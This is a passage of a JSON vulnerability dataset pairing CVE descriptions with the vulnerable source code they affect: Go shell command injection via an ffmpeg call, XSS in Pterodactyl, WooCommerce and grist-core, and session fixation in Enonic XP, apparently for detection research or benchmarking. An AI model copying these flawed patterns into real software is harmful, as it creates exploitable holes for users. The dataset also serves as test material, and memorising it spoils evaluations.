buf.AsFloat32Buffer().Data\n\n\t// Process samples\n\tcontext, err := model.NewContext()\n\tif err != nil {\n\t\treturn res, err\n\n\t}\n\n\tcontext.SetThreads(threads)\n\n\tif language != \"\" {\n\t\tcontext.SetLanguage(language)\n\t} else {\n\t\tcontext.SetLanguage(\"auto\")\n\t}\n\n\tif err := context.Process(data, nil, nil); err != nil {\n\t\treturn res, err\n\t}\n\n\tfor {\n\t\ts, err := context.NextSegment()\n\t\tif err != nil {\n\t\t\tbreak\n\t\t}\n\n\t\tvar tokens []int\n\t\tfor _, t := range s.Tokens {\n\t\t\ttokens = append(tokens, t.Id)\n\t\t}\n\n\t\tsegment := schema.Segment{Id: s.Num, Text: s.Text, Start: s.Start, End: s.End, Tokens: tokens}\n\t\tres.Segments = append(res.Segments, segment)\n\n\t\tres.Text += s.Text\n\t}\n\n\treturn res, nil\n}\n"
        }
      ],
      "method_level": [
        "func sh(c string) (string, error) {\n\tcmd := exec.Command(\"/bin/sh\", \"-c\", c)\n\tcmd.Env = os.Environ()\n\to, err := cmd.CombinedOutput()\n\treturn string(o), err\n}",
        "func audioToWav(src, dst string) error {\n\tout, err := sh(fmt.Sprintf(\"ffmpeg -i %s -format s16le -ar 16000 -ac 1 -acodec pcm_s16le %s\", src, dst))\n\tif err != nil {\n\t\treturn fmt.Errorf(\"error: %w out: %s\", err, out)\n\t}\n\n\treturn nil\n}"
      ],
      "hunk_level": [
        {
          "line_no": 14,
          "content": "func sh(c string) (string, error) {"
        },
        {
          "line_no": 15,
          "content": "\tcmd := exec.Command(\"/bin/sh\", \"-c\", c)"
        },
        {
          "line_no": 17,
          "content": "\to, err := cmd.CombinedOutput()"
        },
        {
          "line_no": 18,
          "content": "\treturn string(o), err"
        },
        {
          "line_no": 24,
          "content": "\tout, err := sh(fmt.Sprintf(\"ffmpeg -i %s -format s16le -ar 16000 -ac 1 -acodec pcm_s16le %s\", src, dst))"
        }
      ]
    },
    "cwe": [
      "CWE-78"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.8,
    "cvss_version": 3.0
  },
  {
    "id": 719,
    "cve": "CVE-2024-34067",
    "description": "Pterodactyl is a free, open-source game server management panel built with PHP, React, and Go. Importing a malicious egg or gaining access to wings instance could lead to cross site scripting (XSS) on the panel, which could be used to gain an administrator account on the panel. Specifically, the following things are impacted: Egg Docker images and Egg variables: Name, Environment variable, Default value, Description, Validation rules. Additionally, certain fields would reflect malicious input, but it would require the user knowingly entering such input to have an impact. To iterate, this would require an administrator to perform actions and can't be triggered by a normal panel user. This issue has has been addressed in version 1.11.6 and users are advised to upgrade. No workaround is available other than updating to the latest version of the panel.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/Http/Requests/Admin/Egg/EggFormRequest.php",
          "content": "<?php\n\nnamespace Pterodactyl\\Http\\Requests\\Admin\\Egg;\n\nuse Pterodactyl\\Http\\Requests\\Admin\\AdminFormRequest;\n\nclass EggFormRequest extends AdminFormRequest\n{\n    public function rules(): array\n    {\n        $rules = [\n            'name' => 'required|string|max:191',\n            'description' => 'nullable|string',\n            'docker_images' => 'required|string',\n            'force_outgoing_ip' => 'sometimes|boolean',\n            'file_denylist' => 'array',\n            'startup' => 'required|string',\n            'config_from' => 'sometimes|bail|nullable|numeric',\n            'config_stop' => 'required_without:config_from|nullable|string|max:191',\n            'config_startup' => 'required_without:config_from|nullable|json',\n            'config_logs' => 'required_without:config_from|nullable|json',\n            'config_files' => 'required_without:config_from|nullable|json',\n        ];\n\n        if ($this->method() === 'POST') {\n            $rules['nest_id'] = 'required|numeric|exists:nests,id';\n        }\n\n        return $rules;\n    }\n\n    public function withValidator($validator)\n    {\n        $validator->sometimes('config_from', 'exists:eggs,id', function () {\n            return (int) $this->input('config_from') !== 0;\n        });\n    }\n\n    public function validated($key = null, $default = null): array\n    {\n        $data = parent::validated();\n\n        return array_merge($data, [\n            'force_outgoing_ip' => array_get($data, 'force_outgoing_ip', false),\n        ]);\n    }\n}\n"
        },
        {
          "name": "app/Http/Requests/Api/Client/Servers/Settings/SetDockerImageRequest.php",
          "content": "<?php\n\nnamespace Pterodactyl\\Http\\Requests\\Api\\Client\\Servers\\Settings;\n\nuse Webmozart\\Assert\\Assert;\nuse Pterodactyl\\Models\\Server;\nuse Illuminate\\Validation\\Rule;\nuse Pterodactyl\\Models\\Permission;\nuse Pterodactyl\\Contracts\\Http\\ClientPermissionsRequest;\nuse Pterodactyl\\Http\\Requests\\Api\\Client\\ClientApiRequest;\n\nclass SetDockerImageRequest extends ClientApiRequest implements ClientPermissionsRequest\n{\n    public function permission(): string\n    {\n        return Permission::ACTION_STARTUP_DOCKER_IMAGE;\n    }\n\n    public function rules(): array\n    {\n        /** @var \\Pterodactyl\\Models\\Server $server */\n        $server = $this->route()->parameter('server');\n\n        Assert::isInstanceOf($server, Server::class);\n\n        return [\n            'docker_image' => ['required', 'string', Rule::in(array_values($server->egg->docker_images))],\n        ];\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function rules(): array\n    {\n        $rules = [\n            'name' => 'required|string|max:191',\n            'description' => 'nullable|string',\n            'docker_images' => 'required|string',\n            'force_outgoing_ip' => 'sometimes|boolean',\n            'file_denylist' => 'array',\n            'startup' => 'required|string',\n            'config_from' => 'sometimes|bail|nullable|numeric',\n            'config_stop' => 'required_without:config_from|nullable|string|max:191',\n            'config_startup' => 'required_without:config_from|nullable|json',\n            'config_logs' => 'required_without:config_from|nullable|json',\n            'config_files' => 'required_without:config_from|nullable|json',\n        ];\n\n        if ($this->method() === 'POST') {\n            $rules['nest_id'] = 'required|numeric|exists:nests,id';\n        }\n\n        return $rules;\n    }",
        "public function rules(): array\n    {\n        /** @var \\Pterodactyl\\Models\\Server $server */\n        $server = $this->route()->parameter('server');\n\n        Assert::isInstanceOf($server, Server::class);\n\n        return [\n            'docker_image' => ['required', 'string', Rule::in(array_values($server->egg->docker_images))],\n        ];\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 14,
          "content": "            'docker_images' => 'required|string',"
        },
        {
          "line_no": 27,
          "content": "            'docker_image' => ['required', 'string', Rule::in(array_values($server->egg->docker_images))],"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.1,
    "cvss_version": 3.1
  },
  {
    "id": 842,
    "cve": "CVE-2024-37297",
    "description": "WooCommerce is an open-source e-commerce platform built on WordPress. A vulnerability introduced in WooCommerce 8.8 allows for cross-site scripting. A bad actor can manipulate a link to include malicious HTML & JavaScript content. While the content is not saved to the database, the links may be sent to victims for malicious purposes. The injected JavaScript could hijack content & data stored in the browser, including the session. The URL content is read through the `Sourcebuster.js` library and then inserted without proper sanitization to the classic checkout and registration forms. Versions 8.8.5 and 8.9.3 contain a patch for the issue. As a workaround, one may disable the Order Attribution feature.",
    "vulnerability": {
      "file_level": [
        {
          "name": "plugins/woocommerce/client/legacy/js/frontend/order-attribution.js",
          "content": "( function ( wc_order_attribution ) {\n\t'use strict';\n\t// Cache params reference for shorter reusability.\n\tconst params = wc_order_attribution.params;\n\n\t// Helper functions.\n\tconst $ = document.querySelector.bind( document );\n\tconst propertyAccessor = ( obj, path ) => path.split( '.' ).reduce( ( acc, part ) => acc && acc[ part ], obj );\n\tconst returnNull = () => null;\n\tconst stringifyFalsyInputValue = ( value ) => value === null || value === undefined ? '' : value;\n\n\t// Hardcode Checkout store key (`wc.wcBlocksData.CHECKOUT_STORE_KEY`), as we no longer have `wc-blocks-checkout` as a dependency.\n\tconst CHECKOUT_STORE_KEY = 'wc/store/checkout';\n\n\t/**\n\t * Get the order attribution data.\n\t *\n\t * Returns object full of `null`s if tracking is disabled.\n\t *\n\t * @returns {Object} Schema compatible object.\n\t */\n\tfunction getData() {\n\t\tconst accessor = params.allowTracking ? propertyAccessor : returnNull;\n\t\tconst entries = Object.entries( wc_order_attribution.fields )\n\t\t\t\t.map( ( [ key, property ] ) => [ key, accessor( sbjs.get, property ) ] );\n\t\treturn Object.fromEntries( entries );\n\t}\n\n\t/**\n\t * Update `wc_order_attribution` input elements' values.\n\t *\n\t * @param {Object} values Object containing field values.\n\t */\n\tfunction updateFormValues( values ) {\n\t\t// Update `<wc-order-attribution-inputs>` elements if any exist.\n\t\tfor( const element of document.querySelectorAll( 'wc-order-attribution-inputs' ) ) {\n\t\t\telement.values = values;\n\t\t}\n\n\t};\n\n\t/**\n\t * Update Checkout extension data.\n\t *\n\t * @param {Object} values Object containing field values.\n\t */\n\tfunction updateCheckoutBlockData( values ) {\n\t\t// Update Checkout block data if available.\n\t\tif ( window.wp && window.wp.data && window.wp.data.dispatch && window.wc && window.wc.wcBlocksData ) {\n\t\t\twindow.wp.data.dispatch( window.wc.wcBlocksData.CHECKOUT_STORE_KEY ).__internalSetExtensionData(\n\t\t\t\t'woocommerce/order-attribution',\n\t\t\t\tvalues,\n\t\t\t\ttrue\n\t\t\t);\n\t\t}\n\t}\n\n\t/**\n\t * Initialize sourcebuster & set data, or clear cookies & data.\n\t *\n\t * @param {boolean} allow Whether to allow tracking or disable it.\n\t */\n\twc_order_attribution.setOrderTracking = function( allow ) {\n\t\tparams.allowTracking = allow;\n\t\tif ( ! allow ) {\n\t\t\t// Reset cookies, and clear form data.\n\t\t\tremoveTrackingCookies();\n\t\t} else if ( typeof sbjs === 'undefined' ) {\n\t\t\treturn; // Do nothing, as sourcebuster.js is not loaded.\n\t\t} else {\n\t\t\t// If not done yet, initialize sourcebuster.js which populates `sbjs.get` object.\n\t\t\tsbjs.init( {\n\t\t\t\tlifetime: Number( params.lifetime ),\n\t\t\t\tsession_length: Number( params.session ),\n\t\t\t\ttimezone_offset: '0', // utc\n\t\t\t} );\n\t\t}\n\t\tconst values = getData();\n\t\tupdateFormValues( values );\n\t\tupdateCheckoutBlockData( values );\n\t}\n\n\t/**\n\t * Remove sourcebuster.js cookies.\n\t * To be called whenever tracking is disabled or consent is revoked.\n\t */\n\tfunction removeTrackingCookies() {\n\t\tconst domain = window.location.hostname;\n\t\tconst sbCookies = [\n\t\t\t'sbjs_current',\n\t\t\t'sbjs_current_add',\n\t\t\t'sbjs_first',\n\t\t\t'sbjs_first_add',\n\t\t\t'sbjs_session',\n\t\t\t'sbjs_udata',\n\t\t\t'sbjs_migrations',\n\t\t\t'sbjs_promo'\n\t\t];\n\n\t\t// Remove cookies\n\t\tsbCookies.forEach( ( name ) => {\n\t\t\tdocument.cookie = `${name}=; path=/; max-age=-999; domain=.${domain};`;\n\t\t} );\n\t}\n\n\t// Run init.\n\twc_order_attribution.setOrderTracking( params.allowTracking );\n\n\t// Work around the lack of explicit script dependency for the checkout block.\n\t// Conditionally, wait for and use 'wp-data' & 'wc-blocks-checkout.\n\n\t// Wait for (async) block checkout initialization and set source values once loaded.\n\tfunction eventuallyInitializeCheckoutBlock() {\n\t\tif (\n\t\t\twindow.wp && window.wp.data && typeof window.wp.data.subscribe === 'function'\n\t\t) {\n\t\t\t// Update checkout block data once more if the checkout store was loaded after this script.\n\t\t\tconst unsubscribe = window.wp.data.subscribe( function () {\n\t\t\t\tunsubscribe();\n\t\t\t\tupdateCheckoutBlockData( getData() );\n\t\t\t}, CHECKOUT_STORE_KEY );\n\t\t}\n\t};\n\t// Wait for DOMContentLoaded to make sure wp.data is in place, if applicable for the page.\n\tif (document.readyState === \"loading\") {\n\t\tdocument.addEventListener(\"DOMContentLoaded\", eventuallyInitializeCheckoutBlock);\n\t} else {\n\t\teventuallyInitializeCheckoutBlock();\n\t}\n\n\t/**\n\t * Define an element to contribute order attribute values to the enclosing form.\n\t * To be used with the classic checkout.\n\t */\n\twindow.customElements.define( 'wc-order-attribution-inputs', class extends HTMLElement {\n\t\t// Our bundler version does not support private class members, so we use a convention of `_` prefix.\n\t\t// #values\n\t\t// #fieldNames\n\t\tconstructor(){\n\t\t\tsuper();\n\t\t\t// Cache fieldNames available at the construction time, to avoid malformed behavior if they change in runtime.\n\t\t\tthis._fieldNames = Object.keys( wc_order_attribution.fields );\n\t\t\t// Allow values to be lazily set before CE upgrade.\n\t\t\tif ( this.hasOwnProperty( '_values' ) ) {\n\t\t\t  let values = this.values;\n\t\t\t  // Restore the setter.\n\t\t\t  delete this.values;\n\t\t\t  this.values = values || {};\n\t\t\t}\n\t\t}\n\t\t/**\n\t\t * Stamp input elements to the element's light DOM.\n\t\t *\n\t\t * We could use `.elementInternals.setFromValue` and avoid sprouting `<input>` elements,\n\t\t * but it's not yet supported in Safari.\n\t\t */\n\t\tconnectedCallback() {\n\t\t\tlet inputs = '';\n\t\t\tfor( const fieldName of this._fieldNames ) {\n\t\t\t\tconst value = stringifyFalsyInputValue( this.values[ fieldName ] );\n\t\t\t\tinputs += `<input type=\"hidden\" name=\"${params.prefix}${fieldName}\" value=\"${value}\"/>`;\n\t\t\t}\n\t\t\tthis.innerHTML = inputs;\n\t\t}\n\n\t\t/**\n\t\t * Update form values.\n\t\t */\n\t\tset values( values ) {\n\t\t\tthis._values = values;\n\t\t\tif( this.isConnected ) {\n\t\t\t\tfor( const fieldName of this._fieldNames ) {\n\t\t\t\t\tconst input = this.querySelector( `input[name=\"${params.prefix}${fieldName}\"]` );\n\t\t\t\t\tif( input ) {\n\t\t\t\t\t\tinput.value = stringifyFalsyInputValue( this.values[ fieldName ] );\n\t\t\t\t\t} else {\n\t\t\t\t\t\tconsole.warn( `Field \"${fieldName}\" not found. Most likely, the '<wc-order-attribution-inputs>' element was manipulated.`);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tget values() {\n\t\t\treturn this._values;\n\t\t}\n\t} );\n\n\n}( window.wc_order_attribution ) );\n"
        }
      ],
      "method_level": [
        "connectedCallback() {\n\t\t\tlet inputs = '';\n\t\t\tfor( const fieldName of this._fieldNames ) {\n\t\t\t\tconst value = stringifyFalsyInputValue( this.values[ fieldName ] );\n\t\t\t\tinputs += `<input type=\"hidden\" name=\"${params.prefix}${fieldName}\" value=\"${value}\"/>`;\n\t\t\t}\n\t\t\tthis.innerHTML = inputs;\n\t\t}"
      ],
      "hunk_level": [
        {
          "line_no": 158,
          "content": "\t\t\tlet inputs = '';"
        },
        {
          "line_no": 160,
          "content": "\t\t\t\tconst value = stringifyFalsyInputValue( this.values[ fieldName ] );"
        },
        {
          "line_no": 161,
          "content": "\t\t\t\tinputs += `<input type=\"hidden\" name=\"${params.prefix}${fieldName}\" value=\"${value}\"/>`;"
        },
        {
          "line_no": 163,
          "content": "\t\t\tthis.innerHTML = inputs;"
        }
      ]
    },
    "cwe": [
      "CWE-79",
      "CWE-80"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.4,
    "cvss_version": 3.1
  },
  {
    "id": 1341,
    "cve": "CVE-2024-56358",
    "description": "grist-core is a spreadsheet hosting server. A user visiting a malicious document and previewing an attachment could have their account compromised, because JavaScript in an SVG file would be evaluated in the context of their current page. This issue has been patched in version 1.3.2. Users are advised to upgrade. Users unable to upgrade should avoid previewing attachments in documents prepared by people they do not trust.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/client/ui/sanitizeHTML.ts",
          "content": "import createDOMPurifier from 'dompurify';\n\nexport function sanitizeHTML(source: string | Node): string {\n  return defaultPurifier.sanitize(source);\n}\n\nexport function sanitizeTutorialHTML(source: string | Node): string {\n  return tutorialPurifier.sanitize(source, {\n    ADD_TAGS: ['iframe'],\n    ADD_ATTR: ['allowFullscreen'],\n  });\n}\n\nconst defaultPurifier = createDOMPurifier();\ndefaultPurifier.addHook('uponSanitizeAttribute', handleSanitizeAttribute);\n\nconst tutorialPurifier = createDOMPurifier();\ntutorialPurifier.addHook('uponSanitizeAttribute', handleSanitizeAttribute);\ntutorialPurifier.addHook('uponSanitizeElement', handleSanitizeTutorialElement);\n\nfunction handleSanitizeAttribute(node: Element) {\n  if (!('target' in node)) { return; }\n\n  node.setAttribute('target', '_blank');\n}\n\nfunction handleSanitizeTutorialElement(node: Element, data: createDOMPurifier.SanitizeElementHookEvent) {\n  if (data.tagName !== 'iframe') { return; }\n\n  const src = node.getAttribute('src');\n  if (src?.startsWith('https://www.youtube.com/embed/')) {\n    return;\n  }\n\n  node.parentNode?.removeChild(node);\n}\n"
        },
        {
          "name": "app/common/urlUtils.ts",
          "content": "import {extractOrgParts, GristLoadConfig} from 'app/common/gristUrls';\n\nexport function getGristConfig(): GristLoadConfig {\n  return (window as any).gristConfig || {};\n}\n\n/**\n *\n * Adds /o/ORG to the supplied path, with ORG extracted from current URL if possible.\n * If not, path is returned as is, but with any trailing / removed for consistency.\n *\n */\nexport function addCurrentOrgToPath(path: string, skipIfInDomain: boolean = false) {\n  if (typeof window === 'undefined' || !window) { return path; }\n  return addOrgToPath(path, window.location.href, skipIfInDomain);\n}\n\n/**\n *\n * Adds /o/ORG to the supplied path, with ORG extracted from the page URL if possible.\n * If not, path is returned as is, but with any trailing / removed for consistency.\n *\n */\nexport function addOrgToPath(path: string, page: string, skipIfInDomain: boolean = false) {\n  if (typeof window === 'undefined' || !window) { return path; }\n  if (path.includes('/o/')) { return path; }\n  const src = new URL(page);\n  const srcParts = extractOrgParts(src.host, src.pathname);\n  if (srcParts.mismatch) {\n    throw new Error('Cannot figure out what organization the URL is for.');\n  }\n  path = path.replace(/\\/$/, '');\n  if (!srcParts.subdomain) {\n    return path;\n  }\n  if (skipIfInDomain && srcParts.orgFromHost) {\n    return path;\n  }\n  return `${path}/o/${srcParts.subdomain}`;\n}\n\n/**\n * Expands an endpoint path to a full url anchored to the given doc worker base url.\n */\nexport function docUrl(docWorkerUrl: string|null|undefined, path?: string) {\n  const base = document.querySelector('base');\n  const baseHref = base && base.href;\n  const baseUrl = new URL(docWorkerUrl || baseHref || window.location.origin);\n  return baseUrl.toString().replace(/\\/$/, '') + (path ? `/${path}` : '');\n}\n\n// Get a url on the same webserver as the current page, adding a prefix to encode\n// the current organization if necessary.\nexport function getOriginUrl(path: string) {\n  return `${window.location.origin}${addCurrentOrgToPath('/', true)}${path}`;\n}\n\n// Return a string docId if server has provided one (as in hosted Grist), otherwise null\n// (as in classic Grist).\nexport function getInitialDocAssignment(): string|null {\n  return getGristConfig().assignmentId || null;\n}\n\n// Return true if we are on a page that can supply a doc list.\n// TODO: the doclist object isn't relevant to hosted grist and should be factored out.\nexport function pageHasDocList(): boolean {\n  // No doc list support on hosted grist.\n  return !getGristConfig().homeUrl;\n}\n\n// Return true if we are on a page that has access to home api.\nexport function pageHasHome(): boolean {\n  return Boolean(getGristConfig().homeUrl);\n}\n\n// Construct a url by adding `path` to the home url (adding in the part to the current\n// org if needed), and fetch from it.\nexport function fetchFromHome(path: string, opts: RequestInit): Promise<Response> {\n  const baseUrl = addCurrentOrgToPath(getGristConfig().homeUrl!);\n  return window.fetch(`${baseUrl}${path}`, opts);\n}\n\n/**\n * Returns the provided URL if it has a valid protocol (`http:` or `https:`), or\n * `null` otherwise.\n */\nexport function sanitizeUrl(url: string): string | null {\n  try {\n    const parsedUrl = new URL(url);\n    if (![\"http:\", \"https:\"].includes(parsedUrl.protocol)) {\n      return null;\n    }\n\n    return parsedUrl.href;\n  } catch (e) {\n    return null;\n  }\n}\n"
        }
      ],
      "method_level": [
        "handleSanitizeTutorialElement",
        "sanitizeUrl"
      ],
      "hunk_level": [
        {
          "line_no": 27,
          "content": "function handleSanitizeTutorialElement(node: Element, data: createDOMPurifier.SanitizeElementHookEvent) {"
        },
        {
          "line_no": 30,
          "content": "  const src = node.getAttribute('src');"
        },
        {
          "line_no": 87,
          "content": "export function sanitizeUrl(url: string): string | null {"
        },
        {
          "line_no": 88,
          "content": "  try {"
        },
        {
          "line_no": 89,
          "content": "    const parsedUrl = new URL(url);"
        },
        {
          "line_no": 90,
          "content": "    if (![\"http:\", \"https:\"].includes(parsedUrl.protocol)) {"
        },
        {
          "line_no": 91,
          "content": "      return null;"
        },
        {
          "line_no": 92,
          "content": "    }"
        },
        {
          "line_no": 94,
          "content": "    return parsedUrl.href;"
        },
        {
          "line_no": 95,
          "content": "  } catch (e) {"
        },
        {
          "line_no": 96,
          "content": "    return null;"
        },
        {
          "line_no": 97,
          "content": "  }"
        },
        {
          "line_no": 98,
          "content": "}"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "HIGH",
    "cvss_score": 8.1,
    "cvss_version": 3.1
  },
  {
    "id": 119,
    "cve": "CVE-2024-23679",
    "description": "Enonic XP versions less than 7.7.4 are vulnerable to a session fixation issue. An remote and unauthenticated attacker can use prior sessions due to the lack of invalidating session attributes.\n\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "modules/lib/lib-auth/src/main/java/com/enonic/xp/lib/auth/LoginHandler.java",
          "content": "package com.enonic.xp.lib.auth;\n\nimport java.util.Comparator;\nimport java.util.concurrent.Callable;\nimport java.util.function.Supplier;\nimport java.util.stream.Collectors;\n\nimport javax.servlet.http.HttpSession;\n\nimport com.enonic.xp.context.Context;\nimport com.enonic.xp.context.ContextBuilder;\nimport com.enonic.xp.portal.PortalRequest;\nimport com.enonic.xp.script.bean.BeanContext;\nimport com.enonic.xp.script.bean.ScriptBean;\nimport com.enonic.xp.security.IdProvider;\nimport com.enonic.xp.security.IdProviderKey;\nimport com.enonic.xp.security.IdProviders;\nimport com.enonic.xp.security.RoleKeys;\nimport com.enonic.xp.security.SecurityConstants;\nimport com.enonic.xp.security.SecurityService;\nimport com.enonic.xp.security.SystemConstants;\nimport com.enonic.xp.security.User;\nimport com.enonic.xp.security.auth.AuthenticationInfo;\nimport com.enonic.xp.security.auth.EmailPasswordAuthToken;\nimport com.enonic.xp.security.auth.UsernamePasswordAuthToken;\nimport com.enonic.xp.security.auth.VerifiedEmailAuthToken;\nimport com.enonic.xp.security.auth.VerifiedUsernameAuthToken;\nimport com.enonic.xp.session.Session;\n\npublic final class LoginHandler\n    implements ScriptBean\n{\n    private enum Scope\n    {\n        SESSION, REQUEST, NONE\n    }\n\n    private String user;\n\n    private String password;\n\n    private boolean skipAuth;\n\n    private String[] idProvider;\n\n    private Integer sessionTimeout;\n\n    private Scope scope;\n\n    private Supplier<SecurityService> securityService;\n\n    private Supplier<Context> context;\n\n    private Supplier<PortalRequest> portalRequestSupplier;\n\n    public void setUser( final String user )\n    {\n        this.user = user;\n    }\n\n    public void setPassword( final String password )\n    {\n        this.password = password;\n    }\n\n    public void setSkipAuth( final boolean skipAuth )\n    {\n        this.skipAuth = skipAuth;\n    }\n\n    public void setIdProvider( final String[] idProvider )\n    {\n        this.idProvider = idProvider;\n    }\n\n    public void setSessionTimeout( final Integer sessionTimeout )\n    {\n        this.sessionTimeout = sessionTimeout;\n    }\n\n    public void setScope( final String scope )\n    {\n        this.scope = Scope.valueOf( scope );\n    }\n\n    public LoginResultMapper login()\n    {\n        AuthenticationInfo authInfo = noIdProviderSpecified() ? attemptLoginWithAllExistingIdProviders() : attemptLogin();\n\n        if ( authInfo.isAuthenticated() )\n        {\n            switch ( this.scope )\n            {\n                case NONE:\n                    // do nothing\n                    break;\n                case REQUEST:\n                    this.context.get().getLocalScope().setAttribute( authInfo );\n                    break;\n                case SESSION:\n                default:\n                    createSession( authInfo );\n                    break;\n            }\n\n            return new LoginResultMapper( authInfo );\n        }\n        else\n        {\n            return new LoginResultMapper( authInfo, \"Access Denied\" );\n        }\n    }\n\n    private void createSession( final AuthenticationInfo authInfo )\n    {\n        final Session session = this.context.get().getLocalScope().getSession();\n        if ( session != null )\n        {\n            session.setAttribute( authInfo );\n        }\n\n        if ( this.sessionTimeout != null )\n        {\n            setSessionTimeout();\n        }\n    }\n\n    private boolean noIdProviderSpecified()\n    {\n        return this.idProvider == null || this.idProvider.length == 0;\n    }\n\n    private AuthenticationInfo attemptLoginWithAllExistingIdProviders()\n    {\n        final IdProviders idProviders = runAsAuthenticated( this::getSortedIdProviders );\n\n        for ( IdProvider idProvider : idProviders )\n        {\n            final AuthenticationInfo authInfo = authenticate( idProvider.getKey() );\n            if ( ( authInfo != null ) && authInfo.isAuthenticated() )\n            {\n                return authInfo;\n            }\n        }\n\n        return AuthenticationInfo.unAuthenticated();\n    }\n\n    private IdProviders getSortedIdProviders()\n    {\n        IdProviders idProviders = securityService.get().getIdProviders();\n        return IdProviders.from( idProviders.stream().\n            sorted( Comparator.comparing( u -> u.getKey().toString() ) ).\n            collect( Collectors.toList() ) );\n    }\n\n    private AuthenticationInfo attemptLogin()\n    {\n\n        for ( String uStore : idProvider )\n        {\n            final AuthenticationInfo authInfo = authenticate( IdProviderKey.from( uStore ) );\n            if ( ( authInfo != null ) && authInfo.isAuthenticated() )\n            {\n                return authInfo;\n            }\n        }\n\n        return AuthenticationInfo.unAuthenticated();\n    }\n\n    private AuthenticationInfo authenticate( IdProviderKey idProvider )\n    {\n        AuthenticationInfo authInfo = null;\n\n        if ( isValidEmail( this.user ) )\n        {\n            if ( this.skipAuth )\n            {\n                final VerifiedEmailAuthToken verifiedEmailAuthToken = new VerifiedEmailAuthToken();\n                verifiedEmailAuthToken.setEmail( this.user );\n                verifiedEmailAuthToken.setIdProvider( idProvider );\n\n                authInfo = runAsAuthenticated( () -> this.securityService.get().authenticate( verifiedEmailAuthToken ) );\n            }\n            else\n            {\n                final EmailPasswordAuthToken emailAuthToken = new EmailPasswordAuthToken();\n                emailAuthToken.setEmail( this.user );\n                emailAuthToken.setPassword( this.password );\n                emailAuthToken.setIdProvider( idProvider );\n\n                authInfo = runAsAuthenticated( () -> this.securityService.get().authenticate( emailAuthToken ) );\n            }\n        }\n\n        if ( authInfo == null || !authInfo.isAuthenticated() )\n        {\n            if ( this.skipAuth )\n            {\n                final VerifiedUsernameAuthToken usernameAuthToken = new VerifiedUsernameAuthToken();\n                usernameAuthToken.setUsername( this.user );\n                usernameAuthToken.setIdProvider( idProvider );\n\n                authInfo = runAsAuthenticated( () -> this.securityService.get().authenticate( usernameAuthToken ) );\n            }\n            else\n            {\n                final UsernamePasswordAuthToken usernameAuthToken = new UsernamePasswordAuthToken();\n                usernameAuthToken.setUsername( this.user );\n                usernameAuthToken.setPassword( this.password );\n                usernameAuthToken.setIdProvider( idProvider );\n\n                authInfo = runAsAuthenticated( () -> this.securityService.get().authenticate( usernameAuthToken ) );\n            }\n        }\n\n        return authInfo;\n    }\n\n    private <T> T runAsAuthenticated( Callable<T> runnable )\n    {\n        final AuthenticationInfo authInfo = AuthenticationInfo.create().principals( RoleKeys.AUTHENTICATED ).user( User.ANONYMOUS ).build();\n        return ContextBuilder.from( this.context.get() ).\n            authInfo( authInfo ).\n            repositoryId( SystemConstants.SYSTEM_REPO_ID ).\n            branch( SecurityConstants.BRANCH_SECURITY ).build().\n            callWith( runnable );\n    }\n\n    private boolean isValidEmail( final String value )\n    {\n        return value != null && value.chars().filter( ch -> ch == '@' ).count() == 1;\n    }\n\n    private void setSessionTimeout()\n    {\n        final PortalRequest portalRequest = this.portalRequestSupplier.get();\n        if ( portalRequest != null )\n        {\n            final HttpSession httpSession = portalRequest.getRawRequest().getSession();\n            if ( httpSession != null )\n            {\n                httpSession.setMaxInactiveInterval( this.sessionTimeout );\n            }\n        }\n    }\n\n    @Override\n    public void initialize( final BeanContext context )\n    {\n        this.securityService = context.getService( SecurityService.class );\n        this.context = context.getBinding( Context.class );\n        this.portalRequestSupplier = context.getBinding( PortalRequest.class );\n    }\n}\n"
        }
      ],
      "method_level": [
        "private void createSession( final AuthenticationInfo authInfo )\n    {\n        final Session session = this.context.get().getLocalScope().getSession();\n        if ( session != null )\n        {\n            session.setAttribute( authInfo );\n        }\n\n        if ( this.sessionTimeout != null )\n        {\n            setSessionTimeout();\n        }\n    }",
        "private IdProviders getSortedIdProviders()\n    {\n        IdProviders idProviders = securityService.get().getIdProviders();\n        return IdProviders.from( idProviders.stream().\n            sorted( Comparator.comparing( u -> u.getKey().toString() ) ).\n            collect( Collectors.toList() ) );\n    }",
        "private <T> T runAsAuthenticated( Callable<T> runnable )\n    {\n        final AuthenticationInfo authInfo = AuthenticationInfo.create().principals( RoleKeys.AUTHENTICATED ).user( User.ANONYMOUS ).build();\n        return ContextBuilder.from( this.context.get() ).\n            authInfo( authInfo ).\n            repositoryId( SystemConstants.SYSTEM_REPO_ID ).\n            branch( SecurityConstants.BRANCH_SECURITY ).build().\n            callWith( runnable );\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 116,
          "content": "        final Session session = this.context.get().getLocalScope().getSession();"
        },
        {
          "line_no": 119,
          "content": "            session.setAttribute( authInfo );"
        },
        {
          "line_no": 120,
          "content": "        }"
        },
        {
          "line_no": 122,
          "content": "        if ( this.sessionTimeout != null )"
        },
        {
          "line_no": 123,
          "content": "        {"
        },
        {
          "line_no": 124,
          "content": "            setSessionTimeout();"
        },
        {
          "line_no": 152,
          "content": "        return IdProviders.from( idProviders.stream()."
        },
        {
          "line_no": 153,
          "content": "            sorted( Comparator.comparing( u -> u.getKey().toString() ) )."
        },
        {
          "line_no": 154,
          "content": "            collect( Collectors.toList() ) );"
        },
        {
          "line_no": 224,
          "content": "        return ContextBuilder.from( this.context.get() )."
        },
        {
          "line_no": 225,
          "content": "            authInfo( authInfo )."
        },
        {
          "line_no": 226,
          "content": "            repositoryId( SystemConstants.SYSTEM_REPO_ID )."
        },
        {
          "line_no": 227,
          "content": "            branch( SecurityConstants.BRANCH_SECURITY ).build()."
        },
        {
          "line_no": 228,
          "content": "            callWith( runnable );"
        }
      ]
    },
    "cwe": [
      "CWE-384"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.8,
    "cvss_version": 3.1
  },
  {
    "id": 1130,
    "cve": "CVE-2024-45522",
    "description": "Linen before cd37c3e does not verify that the domain is linen.dev or www.linen.dev when resetting a password. This occurs in create in apps/web/pages/api/forgot-password/index.ts.",
    "vulnerability": {
      "file_level": [
